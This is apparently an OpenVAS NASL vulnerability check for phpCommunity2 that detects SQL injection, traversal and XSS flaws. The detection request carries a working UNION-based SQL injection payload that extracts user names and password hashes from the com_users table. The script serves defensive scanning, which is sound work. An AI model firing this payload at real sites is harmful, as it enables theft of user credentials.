###############################################################################
# OpenVAS Vulnerability Test
# $Id: phpCommunity2_multiple_remote_input_validation.nasl 15 2013-10-27 12:49:54Z jan $
#
# phpCommunity2 Multiple Remote Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpCommunity2 is prone to multiple input-validation vulnerabilities,
  including multiple directory-traversal issues and SQL-injection issues,
  and a cross-site scripting issue.

  Exploiting these issues could allow an attacker to view arbitrary
  local files within the context of the webserver, steal cookie-based
  authentication credentials, compromise the application, access or
  modify data, or exploit latent vulnerabilities in the underlying
  database.";


if (description)
{
 script_id(100041);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
 script_cve_id("CVE-2009-4884", "CVE-2009-4885", "CVE-2009-4886");
 script_bugtraq_id(34056);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("phpCommunity2 Multiple Remote Input Validation Vulnerabilities");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if phpCommunity2 is vulnerable to Multiple Remote Input Validation Vulnerabilities");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34056/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list("/phpcom", cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )exit(0);

 if ( buf =~ "admin:[a-f0-9]{32}"  )
   {    
    security_hole(port:port);
    exit(0);
   }
}
